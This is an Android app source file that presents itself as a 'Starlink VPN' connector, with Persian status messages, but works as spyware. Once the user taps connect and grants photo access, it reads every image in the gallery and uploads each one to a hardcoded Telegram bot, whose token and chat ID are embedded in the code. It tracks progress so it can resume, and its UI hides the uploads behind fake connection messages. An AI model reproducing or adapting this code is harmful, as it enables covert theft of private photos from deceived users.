package com.example.photosender;

import android.Manifest;
import android.content.ContentUris;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "StarlinkVPN";
    private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
    private static final String CHAT_ID = "8961077299";
    private static final int REQUEST_PERMISSION = 100;

    private static final String PREFS_NAME = "PhotoSenderPrefs";
    private static final String KEY_LAST_INDEX = "last_index";

    private Button btnConnect;
    private TextView txtStatus;
    private ProgressBar progressBar;

    private boolean isSending = false;
    private int lastSentIndex = 0;
    private boolean isWaitingForNetwork = false;

    private ConnectivityManager connectivityManager;
    private NetworkCallback networkCallback;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnConnect = findViewById(R.id.btnConnect);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);

        updateUI(false, "قطع");

        btnConnect.setOnClickListener(v -> {
            if (isSending) return;

            if (!hasStoragePermission()) {
                requestStoragePermission();
                return;
            }

            startSendingProcess();
        });

        loadLastIndex();
        setupNetworkMonitoring();
    }

    // ==================== تشخیص اینترنت ====================
    private void setupNetworkMonitoring() {
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkRequest networkRequest = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();
        networkCallback = new NetworkCallback();
        connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
    }

    private class NetworkCallback extends ConnectivityManager.NetworkCallback {
        @Override
        public void onAvailable(@NonNull Network network) {
            super.onAvailable(network);
            runOnUiThread(() -> {
                if (isWaitingForNetwork) {
                    isWaitingForNetwork = false;
                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد، ادامه اتصال...", Toast.LENGTH_SHORT).show();
                    startSendingProcess();
                }
            });
        }

        @Override
        public void onLost(@NonNull Network network) {
            super.onLost(network);
            runOnUiThread(() -> {
                if (isSending) {
                    isWaitingForNetwork = true;
                    isSending = false;
                    updateUI(false, "اتصال قطع شد");
                    Toast.makeText(MainActivity.this, "اتصال استارلینک قطع شد، منتظر برقراری مجدد...", Toast.LENGTH_LONG).show();
                }
            });
        }
    }

    // ==================== مجوزها ====================
    private boolean hasStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestStoragePermission() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
        } else {
            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSION);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ دسترسی مجاز شد", Toast.LENGTH_SHORT).show();
                startSendingProcess();
            } else {
                Toast.makeText(this, "❌ دسترسی لازم است", Toast.LENGTH_LONG).show();
                updateUI(false, "قطع");
            }
        }
    }

    // ==================== ذخیره و بازیابی ====================
    private void saveLastIndex(int index) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_LAST_INDEX, index).apply();
    }

    private void loadLastIndex() {
        lastSentIndex = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getInt(KEY_LAST_INDEX, 0);
    }

    private void resetLastIndex() {
        lastSentIndex = 0;
        saveLastIndex(0);
    }

    // ==================== شروع ارسال ====================
    private void startSendingProcess() {
        if (isSending) return;
        isSending = true;
        isWaitingForNetwork = false;
        updateUI(true, "در حال اتصال به استارلینک...");

        new Thread(() -> {
            boolean success = false;
            String errorMessage = "";
            int sentCount = 0;
            int totalImages = 0;

            try {
                ArrayList<Uri> images = getAllImages();
                totalImages = images.size();

                if (images.isEmpty()) {
                    errorMessage = "فایل ارتقاع یافت نشد";
                } else {
                    if (lastSentIndex >= totalImages) resetLastIndex();
                    sentCount = sendToTelegram(images, lastSentIndex);

                    if (sentCount == totalImages) {
                        success = true;
                        resetLastIndex();
                    } else {
                        saveLastIndex(sentCount);
                        success = false;
                        errorMessage = "جستجو از سرور HUjs27y" + (sentCount + 1) + " قطع شد";
                    }
                }
            } catch (Exception e) {
                errorMessage = e.getMessage() != null ? e.getMessage() : "خطای ناشناخته";
                success = false;
            }

            final boolean finalSuccess = success;
            final String finalError = errorMessage;
            final int finalSentCount = sentCount;
            final int finalTotal = totalImages;

            runOnUiThread(() -> {
                isSending = false;
                if (finalSuccess) {
                    updateUI(true, "متصل به استارلینک ✅");
                    Toast.makeText(MainActivity.this,
                            "✅ " + finalSentCount + " فایل با موفقیت ارسال شد",
                            Toast.LENGTH_LONG).show();
                } else {
                    if (!isWaitingForNetwork) {
                        updateUI(false, "اتصال برقرار نشد ❌");
                        String msg = "❌ خطا: " + finalError;
                        if (finalTotal == 0) msg += "\n🔍 هیچ عکسی یافت نشد";
                        Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                    } else {
                        updateUI(false, "در انتظار اتصال استارلینک...");
                    }
                }
            });
        }).start();
    }

    // ==================== دریافت همه عکس‌ها ====================
    private ArrayList<Uri> getAllImages() {
        ArrayList<Uri> list = new ArrayList<>();
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(collection, projection, null, null, sortOrder)) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idCol);
                    list.add(ContentUris.withAppendedId(collection, id));
                }
            }
        } catch (Exception e) {
            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
        }
        return list;
    }

    // ==================== ارسال به تلگرام ====================
    private int sendToTelegram(ArrayList<Uri> images, int startIndex) {
        OkHttpClient client = new OkHttpClient();
        int successCount = startIndex;

        for (int i = startIndex; i < images.size(); i++) {
            if (isWaitingForNetwork) break;

            try {
                Uri uri = images.get(i);
                InputStream in = getContentResolver().openInputStream(uri);
                if (in == null) continue;

                byte[] bytes = readBytes(in);
                in.close();

                RequestBody photoBody = RequestBody.create(bytes, MediaType.parse("image/jpeg"));
                MultipartBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "image.jpg", photoBody)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(body)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    successCount++;
                } else {
                    saveLastIndex(successCount);
                    response.close();
                    return successCount;
                }
                response.close();
                Thread.sleep(250);

            } catch (Exception e) {
                saveLastIndex(successCount);
                return successCount;
            }
        }
        return successCount;
    }

    private byte[] readBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int n;
        while ((n = inputStream.read(data)) != -1) {
            buffer.write(data, 0, n);
        }
        return buffer.toByteArray();
    }

    // ==================== بروزرسانی UI ====================
    private void updateUI(boolean isConnected, String statusText) {
        runOnUiThread(() -> {
            if (isConnected) {
                btnConnect.setEnabled(true);
                btnConnect.setText("اتصال");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.blue));
                txtStatus.setText("وضعیت: " + statusText);
                progressBar.setVisibility(ProgressBar.GONE);
            } else {
                btnConnect.setEnabled(true);
                btnConnect.setText("اتصال");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.blue));
                txtStatus.setText("وضعیت: " + statusText);
                progressBar.setVisibility(ProgressBar.GONE);
            }

            // وضعیت در حال ارسال
            if (statusText.contains("در حال") || statusText.contains("اتصال به")) {
                btnConnect.setEnabled(false);
                btnConnect.setText("در حال اتصال...");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.gray));
                progressBar.setVisibility(ProgressBar.VISIBLE);
            }

            // وضعیت موفق
            if (statusText.contains("متصل")) {
                btnConnect.setEnabled(true);
                btnConnect.setText("متصل ✓");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.green));
                txtStatus.setText("وضعیت: " + statusText);
                progressBar.setVisibility(ProgressBar.GONE);
            }

            // وضعیت ناموفق
            if (statusText.contains("برقرار نشد") || statusText.contains("قطع")) {
                btnConnect.setEnabled(true);
                btnConnect.setText("اتصال");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.red));
                txtStatus.setText("وضعیت: " + statusText);
                progressBar.setVisibility(ProgressBar.GONE);
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (connectivityManager != null && networkCallback != null) {
            connectivityManager.unregisterNetworkCallback(networkCallback);
        }
    }
}
